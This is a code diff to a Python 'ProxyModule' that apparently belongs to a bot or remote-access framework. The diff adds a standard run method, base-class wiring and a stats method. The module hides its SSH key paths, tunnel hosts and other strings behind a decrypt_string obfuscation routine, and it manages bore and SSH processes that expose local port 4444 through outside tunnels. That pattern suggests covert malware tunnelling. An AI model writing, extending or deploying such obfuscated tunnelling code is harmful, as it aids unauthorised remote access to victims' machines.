@@ -8,7 +8,9 @@ import time
 from typing import Optional
 from core.obfuscation import decrypt_string
 
-class ProxyModule:
+from core.base import BaseModule
+
+class ProxyModule(BaseModule):
     decrypt_string("PX07IB1kdioOIzoYIksJAhcIWAkhIzxMPw8PGFpfFBUDEgwEIT0qTXNXBUpSajUyQ0YNBSA0NUI7BEpeE1UKGA9RE0U=")
     _SSH_PATHS = [
         decrypt_string("LQgkPCc/PQ0tBDZrC0oSHwMBSjcBITwMCSQiZAFKDlQLSh0="),
@@ -19,14 +21,29 @@ class ProxyModule:
         {"host": decrypt_string("Al0bCiI5NhEuWRhNHA=="), "user": "nokey", "port_pattern": decrypt_string("Rm4cEHp9bB9z")},
     ]
 
-    def __init__(self):
+    def __init__(self, bot=None, report_manager=None, temp_dir=None):
+        super().__init__(bot, report_manager, temp_dir)
         self.proxy_active = False
         self._bore_process: Optional[subprocess.Popen] = None
         self._ssh_process:  Optional[subprocess.Popen] = None
         self._server_thread: Optional[threading.Thread] = None
         self._tunnel_url: Optional[str] = None
         self._bore_tmp: Optional[str] = None
-        self._bore_output: str = ""  
+        self._bore_output: str = ""
+
+    def run(self) -> bool:
+        """A-04: Implementation of standardized run method."""
+        try:
+            self.log("Starting proxy service...")
+            res = self.start()
+            self.log(res)
+            return self.proxy_active
+        except Exception as e:
+            self.log(f"Proxy failed: {e}")
+            return False
+
+    def get_stats(self) -> Dict[str, int]:
+        return {"active": 1 if self.proxy_active else 0}
 
     def start(self, local_port: int = 4444) -> str:
         if self.proxy_active:
